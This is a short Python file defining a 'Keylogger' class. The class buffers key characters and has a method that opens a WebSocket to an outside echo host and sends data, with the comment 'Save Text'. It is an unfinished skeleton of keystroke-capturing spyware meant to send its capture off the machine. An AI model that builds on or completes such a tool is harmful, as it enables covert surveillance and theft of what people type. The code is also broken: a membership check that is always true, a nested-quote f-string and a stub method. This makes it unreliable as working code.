import string as s
import numbers as n
import asyncio as a
from datetime import datetime
import websocket as w # noqa
import json


class Keylogger():
    def __init__(self, *args, **kwargs):
        self.k = kwargs.setdefault("p", False)
        self.str_txt = ""
        self.exe = True
    
    async def on(self, key) -> str:
        self.exe = True
        if key in s.ascii_letters or s.digits or s.hexdigits:
            self.str_txt += key
            if self.k:
                print(self.txt)
            return key
        return ""
    
    async def off(self, method, number_time):
        print(f"Program Sleeping!! {datetime.now().strftime("%d/%m/%Y - %H:%M:%S")}")
        self.exe = True
        
        await a.sleep(number_time)
        
    
    async def web(self):
        ws = w.WebSocket()
        ws.connect("ws://websockets.chilkat.io/wsChilkatEcho.ashx")
        # Save Text
        ws.send(json.dumps({"name": "pedro"}))
        return ws.recv()
    
    def insert(self, file):
        ...
    
    @property
    def txt(self):
        return self.str_txt
    